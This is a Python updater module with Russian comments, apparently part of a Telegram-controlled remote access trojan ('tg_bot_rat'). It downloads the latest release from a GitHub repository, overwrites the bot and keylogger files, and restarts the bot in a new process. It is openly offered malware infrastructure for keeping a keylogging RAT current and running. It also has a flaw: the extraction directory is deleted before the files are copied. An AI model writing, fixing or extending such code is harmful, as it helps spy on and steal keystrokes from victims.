import os
import sys
import json
import shutil
import subprocess
import tempfile
import zipfile
from pathlib import Path
from typing import Optional, Tuple
import requests
import logging

logger = logging.getLogger(__name__)

# Конфигурация репозитория
GITHUB_REPO = "your-username/tg_bot_rat"  # Замени на свой репозиторий
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "")  # Опционально для приватных репо

class Updater:
    def __init__(self):
        self.current_dir = Path.cwd()
        self.version_file = self.current_dir / "version.txt"
        self.backup_dir = self.current_dir / "backup"
        
    def get_current_version(self) -> str:
        """Получить текущую версию из version.txt."""
        if self.version_file.exists():
            try:
                return self.version_file.read_text(encoding="utf-8").strip()
            except Exception:
                pass
        return "1.0.0"  # Версия по умолчанию
    
    def set_version(self, version: str) -> None:
        """Сохранить версию в version.txt."""
        try:
            self.version_file.write_text(version, encoding="utf-8")
        except Exception as e:
            logger.warning(f"Не удалось сохранить версию: {e}")
    
    def get_latest_release(self) -> Tuple[Optional[str], Optional[str]]:
        """Получить последний релиз с GitHub."""
        try:
            url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
            headers = {}
            if GITHUB_TOKEN:
                headers["Authorization"] = f"token {GITHUB_TOKEN}"
            
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            version = data.get("tag_name", "").lstrip("v")
            download_url = None
            
            # Ищем zip архив релиза
            for asset in data.get("assets", []):
                if asset["name"].endswith(".zip"):
                    download_url = asset["browser_download_url"]
                    break
            
            if not download_url:
                # Если нет готового архива, скачиваем исходники
                download_url = f"https://github.com/{GITHUB_REPO}/archive/refs/tags/{data['tag_name']}.zip"
            
            return version, download_url
            
        except Exception as e:
            logger.error(f"Ошибка при получении релиза: {e}")
            return None, None
    
    def download_and_extract(self, download_url: str) -> Optional[Path]:
        """Скачать и распаковать обновление."""
        try:
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                zip_path = temp_path / "update.zip"
                
                # Скачиваем архив
                logger.info("Скачивание обновления...")
                response = requests.get(download_url, timeout=30)
                response.raise_for_status()
                
                with open(zip_path, "wb") as f:
                    f.write(response.content)
                
                # Распаковываем
                extract_path = temp_path / "extracted"
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(extract_path)
                
                # Ищем папку с исходниками (GitHub создаёт папку вида repo-name-tag)
                extracted_dirs = list(extract_path.iterdir())
                if extracted_dirs:
                    return extracted_dirs[0]
                
        except Exception as e:
            logger.error(f"Ошибка при скачивании: {e}")
        return None
    
    def backup_current_files(self) -> bool:
        """Создать резервную копию текущих файлов."""
        try:
            if self.backup_dir.exists():
                shutil.rmtree(self.backup_dir)
            
            self.backup_dir.mkdir(parents=True)
            
            # Копируем основные файлы
            files_to_backup = ["bot.py", "keylogger.py", "requirements.txt", "README.md"]
            for file_name in files_to_backup:
                src = self.current_dir / file_name
                if src.exists():
                    shutil.copy2(src, self.backup_dir / file_name)
            
            logger.info("Резервная копия создана")
            return True
            
        except Exception as e:
            logger.error(f"Ошибка при создании резервной копии: {e}")
            return False
    
    def apply_update(self, new_source_dir: Path) -> bool:
        """Применить обновление."""
        try:
            # Копируем новые файлы
            files_to_update = ["bot.py", "keylogger.py", "requirements.txt", "README.md"]
            
            for file_name in files_to_update:
                src = new_source_dir / file_name
                dst = self.current_dir / file_name
                
                if src.exists():
                    shutil.copy2(src, dst)
                    logger.info(f"Обновлён файл: {file_name}")
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка при применении обновления: {e}")
            return False
    
    def restore_backup(self) -> bool:
        """Восстановить из резервной копии."""
        try:
            if not self.backup_dir.exists():
                return False
            
            files_to_restore = ["bot.py", "keylogger.py", "requirements.txt", "README.md"]
            
            for file_name in files_to_restore:
                src = self.backup_dir / file_name
                dst = self.current_dir / file_name
                
                if src.exists():
                    shutil.copy2(src, dst)
                    logger.info(f"Восстановлен файл: {file_name}")
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка при восстановлении: {e}")
            return False
    
    def check_for_updates(self) -> Tuple[bool, str, str]:
        """Проверить наличие обновлений."""
        current_version = self.get_current_version()
        latest_version, download_url = self.get_latest_release()
        
        if not latest_version or not download_url:
            return False, current_version, "Ошибка получения информации"
        
        # Простое сравнение версий (можно улучшить)
        if latest_version != current_version:
            return True, latest_version, download_url
        
        return False, current_version, "Уже последняя версия"
    
    def update(self) -> Tuple[bool, str]:
        """Выполнить обновление."""
        try:
            # Проверяем наличие обновлений
            has_update, latest_version, download_url = self.check_for_updates()
            
            if not has_update:
                return False, "Обновлений нет"
            
            logger.info(f"Найдено обновление: {latest_version}")
            
            # Создаём резервную копию
            if not self.backup_current_files():
                return False, "Ошибка создания резервной копии"
            
            # Скачиваем и распаковываем
            new_source_dir = self.download_and_extract(download_url)
            if not new_source_dir:
                return False, "Ошибка скачивания обновления"
            
            # Применяем обновление
            if not self.apply_update(new_source_dir):
                # Восстанавливаем из резервной копии
                self.restore_backup()
                return False, "Ошибка применения обновления"
            
            # Обновляем версию
            self.set_version(latest_version)
            
            return True, f"Обновление до версии {latest_version} завершено"
            
        except Exception as e:
            logger.error(f"Ошибка при обновлении: {e}")
            return False, f"Ошибка: {e}"
    
    def restart_bot(self) -> None:
        """Перезапустить бота."""
        try:
            # Запускаем новый процесс
            python_exe = sys.executable
            script_path = self.current_dir / "bot.py"
            
            subprocess.Popen([python_exe, str(script_path)], 
                           cwd=self.current_dir,
                           creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0)
            
            # Завершаем текущий процесс
            sys.exit(0)
            
        except Exception as e:
            logger.error(f"Ошибка при перезапуске: {e}")


# Глобальный экземпляр
updater = Updater()
